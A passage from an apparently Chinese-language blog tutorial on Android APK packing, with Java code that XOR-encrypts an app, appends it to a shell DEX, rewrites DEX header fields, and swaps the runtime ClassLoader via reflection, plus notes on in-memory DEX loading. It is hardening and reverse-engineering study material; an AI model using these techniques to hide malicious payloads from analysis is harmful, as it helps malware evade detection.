class_">byte</span>[<span class="hljs-number">4</span>];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span>, bytedexlen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>       <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytedexlen);<br>       <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">dis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bais);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">readInt</span> <span class="hljs-operator">=</span> dis.readInt();<br>       Log.d(TAG,<span class="hljs-string">&quot;Integer.toHexString(readInt):&quot;</span>+Integer.toHexString(readInt));<br><br>       <span class="hljs-comment">//取出壳apk</span><br>       <span class="hljs-type">byte</span>[] encryptdata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[readInt]; <span class="hljs-comment">//这是一个变量名，用于存储从输入流中读取的整数。</span><br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span> - readInt, encryptdata, <span class="hljs-number">0</span>, readInt);<br><br>       <span class="hljs-comment">//对源程序Apk进行解密</span><br>       <span class="hljs-type">byte</span>[] flatdata = xorcrypt(encryptdata);<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">//跟踪数据的位置</span><br>       <span class="hljs-type">byte</span> [] byteunamelen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <span class="hljs-comment">//用户名长度信息</span><br>       System.arraycopy(flatdata, offset, byteunamelen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">//从flatdata数组中复制4个字节到byteunamelen数组</span><br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">unamelen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteunamelen);  <span class="hljs-comment">//将字节转换为整数，得到用户名的长度</span><br>       <span class="hljs-type">byte</span>[] username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[unamelen];<br>       System.arraycopy(flatdata , offset, username, <span class="hljs-number">0</span>, unamelen);<br>       offset += unamelen;<br><br>       gUserNameStr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username);<br><br>       <span class="hljs-type">byte</span> [] byteiplen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <span class="hljs-comment">//创建一个新的数组byteiplen用于存储IP地址的长度信息。</span><br>       System.arraycopy(flatdata, offset, byteiplen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">iplen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteiplen);<br>       <span class="hljs-type">byte</span>[] ip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iplen];<br>       System.arraycopy(flatdata , offset, ip, <span class="hljs-number">0</span>, iplen);<br>       offset += iplen;<br><br>       gIPstr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ip);<br><br>       Log.e(TAG,<span class="hljs-string">&quot;username:&quot;</span>+ gUserNameStr + <span class="hljs-string">&quot; ip:&quot;</span> + gIPstr);  <span class="hljs-comment">//记录用户名和IP地址到日志。</span><br><br>       Utils.setValue(context,PARAMCONFIG_FileName,<span class="hljs-string">&quot;username&quot;</span>,gUserNameStr);  <span class="hljs-comment">//将用户名和IP地址保存到配置文件中。</span><br>       Utils.setValue(context,PARAMCONFIG_FileName,<span class="hljs-string">&quot;ip&quot;</span>,gIPstr);<br><br>       <span class="hljs-comment">//写入源apk文件</span><br>       <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(srcDexFilePath);  <span class="hljs-comment">//创建一个新的文件对象，它指向源DEX文件的路径</span><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">localFileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);  <span class="hljs-comment">//打开file文件输出流</span><br>           localFileOutputStream.write(flatdata,offset,readInt - offset);  <span class="hljs-comment">//从offset开始的flatdata数组写入</span><br>           localFileOutputStream.close();  <span class="hljs-comment">//关闭</span><br>       &#125; <span class="hljs-keyword">catch</span> (IOException localIOException) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(localIOException);<br>       &#125;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">bits</span> <span class="hljs-operator">=</span> Utils.getSystemBits();     <span class="hljs-comment">//Utils.getSystemBits()方法（此方法没有在代码片段中定义）来获取当前系统的位数（通常是32位或64位）</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">libprefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lib/&quot;</span> + Build.CPU_ABI;  <span class="hljs-comment">//Build.CPU_ABI是Android提供的一个变量，代表当前设备首选的ABI（应用程序二进制接口）。</span><br><br>       <span class="hljs-comment">//分析源apk文件</span><br>       <span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)));  <span class="hljs-comment">//读取APK</span><br>      <span class="hljs-comment">//用于遍历APK文件中的每个ZIP条目</span><br>       <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>           <span class="hljs-type">ZipEntry</span> <span class="hljs-variable">ze</span> <span class="hljs-operator">=</span> zis.getNextEntry();<br>           <span class="hljs-keyword">if</span> (ze == <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">break</span>;<br>           &#125;<br>           <br>           <span class="hljs-comment">//依次取出被加壳apk用到的so文件，放到 libPath中（data/data/包名/payload_lib)</span><br>           <span class="hljs-type">String</span> <span class="hljs-variable">zfn</span> <span class="hljs-operator">=</span> ze.getName();  <span class="hljs-comment">//对于每个ZIP条目，获取其名称并存储在zfn变量中。</span><br><br>           <span class="hljs-keyword">if</span> (zfn.startsWith(libprefix) &amp;&amp; zfn.endsWith(<span class="hljs-string">&quot;.so&quot;</span>)) &#123;  <span class="hljs-comment">//判断是否为so文件  zfn.startsWith(libprefix)//检查开头</span><br>               <span class="hljs-comment">//zfn.substring(zfn.lastIndexOf(&#x27;/&#x27;))截取so文件的名称，用于存放解压后的so文件</span><br>               <span class="hljs-type">File</span> <span class="hljs-variable">sofile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(libPath + zfn.substring(zfn.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>)));  <br>               <br>               sofile.createNewFile();  <span class="hljs-comment">//创建文件</span><br>               <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(sofile); <span class="hljs-comment">//写入</span><br>               <span class="hljs-type">byte</span>[] readbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0x4000</span>];  <span class="hljs-comment">//缓冲区</span><br>               <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;   <span class="hljs-comment">//ZIP流中读取数据</span><br>                   <span class="hljs-type">int</span> <span class="hljs-variable">readlen</span> <span class="hljs-operator">=</span> zis.read(readbuf);<br>                   <span class="hljs-keyword">if</span> (readlen == -<span class="hljs-number">1</span>)&#123;<br>                       <span class="hljs-keyword">break</span>;<br>                   &#125;<br>                   fos.write(readbuf, <span class="hljs-number">0</span>, readlen);<br>               &#125;<br>               fos.flush();<br>               fos.close();<br>               Log.e(TAG,<span class="hljs-string">&quot;get lib:&quot;</span> + zfn );<br>           &#125;<br>           zis.closeEntry();<br>       &#125;<br>       zis.close();<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>核心代码;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">splitPayLoadFromDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] shelldexdata)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <span class="hljs-comment">//shelldexdata==dexdata</span><br>       <span class="hljs-comment">//取被加壳apk的长度</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">sdlen</span> <span class="hljs-operator">=</span> shelldexdata.length;<br>       <span class="hljs-type">byte</span>[] bytedexlen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span>, bytedexlen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>       <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytedexlen);<br>       <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">dis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bais);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">readInt</span> <span class="hljs-operator">=</span> dis.readInt();<br>       Log.d(TAG,<span class="hljs-string">&quot;Integer.toHexString(readInt):&quot;</span>+Integer.toHexString(readInt));<br><br>       <span class="hljs-comment">//取出apk</span><br>       <span class="hljs-type">byte</span>[] encryptdata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[readInt];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span> - readInt, encryptdata, <span class="hljs-number">0</span>, readInt);<br><br>       <span class="hljs-comment">//对源程序Apk进行加密</span><br>       <span class="hljs-type">byte</span>[] flatdata = xorcrypt(encryptdata);<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">//跟踪数据的位置</span><br>       <span class="hljs-type">byte</span> [] byteunamelen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <span class="hljs-comment">//用户名长度信息</span><br>       System.arraycopy(flatdata, offset, byteunamelen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">//从flatdata数组中复制4个字节到byteunamelen数组</span><br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">unamelen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteunamelen);  <span class="hljs-comment">//将字节转换为整数，得到用户名的长度</span><br>       <span class="hljs-type">byte</span>[] username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[unamelen];<br>       System.arraycopy(flatdata , offset, username, <span class="hljs-number">0</span>, unamelen);<br>       offset += unamelen;<br><br>       gUserNameStr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username);<br><br>       <span class="hljs-type">byte</span> [] byteiplen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <span class="hljs-comment">//创建一个新的数组byteiplen用于存储IP地址的长度信息。</span><br>       System.arraycopy(flatdata, offset, byteiplen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">iplen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteiplen);<br>       <span class="hljs-type">byte</span>[] ip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iplen];<br>       System.arraycopy(flatdata , offset, ip, <span class="hljs-number">0</span>, iplen);<br>       offset += iplen;<br><br>       gIPstr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ip);<br></code></pre></td></tr></table></figure><p>加密函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] xorcrypt(<span class="hljs-type">byte</span>[] srcdata)&#123;<br>    <span class="hljs-type">byte</span>[] key = cryptKey.getBytes();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">keylen</span> <span class="hljs-operator">=</span> cryptKey.length();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>; i&lt;srcdata.length; i++)&#123;<br>        srcdata[i] = (<span class="hljs-type">byte</span>)(key[j] ^ srcdata[i]);<br>        j ++;<br>        <span class="hljs-keyword">if</span>(j &gt;= keylen)&#123;<br>            j = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> srcdata;<br>&#125;<br></code></pre></td></tr></table></figure><p>apkshell</p><p>通过apkUnshell.app进行解密提取出源dex，然后进行加壳 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">encryptsize</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)( <span class="hljs-number">4</span> + username.length() + <span class="hljs-number">4</span> + ip.length() + srcApkFile.length());<br><span class="hljs-type">byte</span>[] enSrcApkArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encryptsize];<br><span class="hljs-comment">// ... 将用户名长度、用户名、IP长度、IP和原始APK数据复制到数组中</span><br>xorcrpt(enSrcApkArray); <span class="hljs-comment">// 异或加密APK数据</span><br><br><span class="hljs-comment">// ... 读取壳APK的DEX文件</span><br><span class="hljs-type">byte</span>[] newdex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[totalLen];<br>System.arraycopy(unShellDexArray, <span class="hljs-number">0</span>, newdex, <span class="hljs-number">0</span>, unShellDexLen); <span class="hljs-comment">// 复制壳DEX数据</span><br>System.arraycopy(enSrcApkArray, <span class="hljs-number">0</span>, newdex, unShellDexLen, enSrcApkLen); <span class="hljs-comment">// 复制加密后的APK数据</span><br><br>fixFileSizeHeader(newdex); <span class="hljs-comment">// 修改DEX文件头中的文件大小信息</span><br>fixSHA1Header(newdex); <span class="hljs-comment">// 修改DEX文件头中的SHA-1散列值</span><br>fixCheckSumHeader(newdex); <span class="hljs-comment">// 修改DEX文件头中的校验和</span><br><br><span class="hljs-comment">// ... 将新的DEX文件写入文件系统</span><br><span class="hljs-comment">// 删除META-INF目录</span><br>ZipUtils.zipDir(shellApkfn + <span class="hljs-string">&quot;_new.apk&quot;</span>, unzipPath); <span class="hljs-comment">// 将修改后的文件重新压缩打包成APK</span><br><br></code></pre></td></tr></table></figure><p>在提供的代码中，修改DEX文件头部的一些信息，具体指文件大小、SHA-1哈希和校验和的部分位于以下几个方法：</p><p><strong>修改文件大小 (<code>fixFileSizeHeader</code>)：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixFileSizeHeader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> &#123;<br>    <span class="hljs-type">byte</span>[] newfs = intToByte(dexBytes.length);  <br>    <span class="hljs-type">byte</span>[] refs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        refs[i] = newfs[newfs.length - <span class="hljs-number">1</span> - i];<br>    &#125;<br>    <br>    System.arraycopy(refs, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>);<br>    <br>    System.out.println(<span class="hljs-string">&quot;new dex file size:&quot;</span> + Integer.toHexString(dexBytes.length));<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法使用了<code>intToByte</code>方法来将DEX文件的新长度转换成字节数组，并更新DEX文件头中的文件大小字段。</p><p><strong>修改SHA-1哈希 (<code>fixSHA1Header</code>)：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixSHA1Header</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;  <br>    <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-1&quot;</span>);  <br>    md.update(dexBytes, <span class="hljs-number">32</span>, dexBytes.length - <span class="hljs-number">32</span>); <span class="hljs-comment">// 从32字节之后开始计算SHA-1哈希值</span><br><br>    <span class="hljs-type">byte</span>[] newdt = md.digest();  <br>    System.arraycopy(newdt, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">12</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// SHA-1哈希值长度为20字节</span><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">hexstr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; newdt.length; i++) &#123;  <br>        hexstr += Integer.toString((newdt[i] &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-number">0x100</span>, <span class="hljs-number">16</span>).substring(<span class="hljs-number">1</span>);<br>    &#125;  <br>    System.out.println(<span class="hljs-string">&quot;new dex sha-1:&quot;</span> + hexstr);  <br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个方法计算了从第32字节到文件末尾的SHA-1哈希，并将结果复制到DEX头的SHA-1哈希字段中。</p><p><strong>修改校验和 (<code>fixCheckSumHeader</code>)：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixCheckSumHeader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> &#123;  <br>    <span class="hljs-type">Adler32</span> <span class="hljs-variable">adler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Adler32</span>();  <br>    adler.update(dexBytes, <span class="hljs-number">12</span>, dexBytes.length - <span class="hljs-number">12</span>); <span class="hljs-comment">// 从12字节之后开始计算校验和</span><br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)adler.getValue();  <br>    <span class="hljs-type">byte</span>[] newcs = intToByte(value);  <br><br>    <span class="hljs-type">byte</span>[] recs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;  <br>        recs[i] = newcs[newcs.length - <span class="hljs-number">1</span> - i];  <br>    &#125;  <br>    <br>    System.arraycopy(recs, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 校验和字段位于8-11字节</span><br>    <br>    System.out.println(<span class="hljs-string">&quot;new dex checksum:&quot;</span> +Integer.toHexString(value));<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个方法使用<code>Adler32</code>算法来计算DEX文件的校验和，并将其更新到DEX文件头中的相应字段。</p><p>流程：</p><p>简要：</p><ol><li>原始dex加密。</li><li>记录dex还原信息。</li><li>壳dex尾部追加加密。</li><li>追加dex还原信息。</li><li>追加还原信息长度。</li><li>filesize：dex原来长度+dex加密字节长度+dex还原信息长度+4字节（还原信息长度）。</li><li>计算signature（除了标识头，checksum其余的hash值）。</li><li>计算chceksum（除了标识头，checksum外所有）。</li><li>重新打包。</li></ol><p>实现还原：</p><ol><li>末尾4字节</li><li>得到还原信息</li><li>得到dex字节列表进行加密</li><li>dexclassloader进行加载替换 结束</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs stylus">第一部分释放出源程序apk。<br><br><span class="hljs-number">1</span>.获取当前android<span class="hljs-selector-class">.app</span>.ActivityThread类对象currentActivityThread，并在其中找到ArrayMap类型的对象成员mPackages，并在mPackages中找到当前包名的android<span class="hljs-selector-class">.app</span>.LoadedApk对象。<br><span class="hljs-number">2</span>.在上述android<span class="hljs-selector-class">.app</span>.ActivityThread实例中，找到ClassLoader类的实例成员mClassLoader。<br><span class="hljs-number">3</span>.通过DexClassLoader加载释放出来的源程序apk。<br><span class="hljs-number">4</span>.将上述mClassLoader替换为加载源程序的DexClassLoader。<br><br><br>第二部分功能在onCreate方法中，其主要工作如下:<br><br><span class="hljs-number">1</span>.加载资源。<br><br><span class="hljs-number">2</span>.获取壳程序AndroidManifest.xml中源程序的包名和Application。<br><br><span class="hljs-number">3</span>.执行android<span class="hljs-selector-class">.app</span>.ActivityThread类的currentActivityThread方法，获取当前的android<span class="hljs-selector-class">.app</span>.ActivityThread实例currentActivityThread。<br><br><span class="hljs-number">4</span>.获取currentActivityThread中的android<span class="hljs-selector-class">.app</span>.ActivityThread类实例成员mBoundApplication。<br><br><span class="hljs-number">5</span>.在上述mBoundApplication中获取android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$AppBindData</span>类实例info。<br><br><span class="hljs-number">6</span>.将上述info实例中的android<span class="hljs-selector-class">.app</span>.LoadedApk类实例成员mApplication设置为null。<br><br><span class="hljs-number">7</span>.在currentActivityThread中获取android<span class="hljs-selector-class">.app</span>.ActivityThread类实例mInitialApplication。<br><br><span class="hljs-number">8</span>.在currentActivityThread中获取android<span class="hljs-selector-class">.app</span>.ActivityThread类对象mAllApplications，该对象是个ArrayList&lt;Application&gt;结构，并在次结构中删除mInitialApplication对象。<br><br><span class="hljs-number">9</span>.获取info对象中android<span class="hljs-selector-class">.app</span>.LoadedApk类成员对象mApplicationInfo。<br><br><span class="hljs-number">10</span>.在mBoundApplication对象中获取android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$AppBindData</span>类成员对象appInfo。<br><br><span class="hljs-number">11</span>.appInfo和mApplicationInfo实例的className成员变量设置为源程序的包名。<br><br><span class="hljs-number">12</span>.执行android<span class="hljs-selector-class">.app</span>.LoadedApk类对象info中的成员方法makeApplicationinfo，创建一个Application类实例。<br><br><span class="hljs-number">13</span>.设置android<span class="hljs-selector-class">.app</span>.ActivityThread类实例currentActivityThread中的成员对象mInitialApplication的值为上一步创建的Application类实例。<br><br><span class="hljs-number">14</span>.获取android<span class="hljs-selector-class">.app</span>.ActivityThread类对象currentActivityThread中的成员对象mProviderMap，该对象是一个ArrayMap结构，其元素是android<span class="hljs-selector-class">.app</span>.ActivityThread<span class="hljs-variable">$ProviderClientRecord</span>类。<br><br><span class="hljs-number">15</span>.遍历该成员对象，并获取其成员对象mLocalProvider，该成员对象是android<span class="hljs-selector-class">.content</span>.ContentProvider类，设置该android<span class="hljs-selector-class">.content</span>.ContentProvider类的成员对象mContext值为上述创建的Application。<br><br><span class="hljs-number">16</span>.调用上述步骤所创建的Application类实例中的onCreate方法。<br><br><br>第三部分 加壳<br></code></pre></td></tr></table></figure><h5 id="第二代壳：内存中的源APK字节码进行加载"><a href="#第二代壳：内存中的源APK字节码进行加载" class="headerlink" title="第二代壳：内存中的源APK字节码进行加载"></a>第二代壳：内存中的源APK字节码进行加载</h5><ul><li>Android 4及以下，最终调用带三个参数的native方法openDexFile()，但并不接受文件字节码作为参数。然而其另一个重载方法接受字节码数组作为参数传入。</li><li>Android 5~7，最终调用<code>openDexFile()</code>方法，里面会调用native方法<code>openDexFileNative()</code>，然而并不接受文件字节码作为参数。因此需要借助<code>libart.so</code>库中的<code>OpenMemory()</code>函数来实现内存加载文件字节码（需要编写native层代码实现）。</li><li>Android 8及以上，跟Android 5~7一样的流程，但是额外多了一个用于加载内存dex的类加载器InMemoryDexClassLoader</li></ul><p>都会返回一个cookie（DexFile的首地址）值</p><p><strong>dex中类的加载</strong></p><p>系统给定的类加载器DexClassLoader和PathClassLoader类加载器，在创建时值接受（dex相关）文件路径。中间的方法（3~6）都只是作为一个跳板而已</p><p><img src="image-20240329213832780.png" alt="image-20240329213832780"></p><p>&#x2F;libcore&#x2F;dalvik&#x2F;src&#x2F;main&#x2F;java&#x2F;dalvik&#x2F;system&#x2F;DexFile.java中的getClassNameList()方法可获得从cookie中获得dex所有类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String[] getClassNameList(Object cookie);<br></code></pre></td></tr></table></figure><p>Android7多了一个DexFile参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">defineClassNative(String name, ClassLoader loader, Object cookie, DexFile 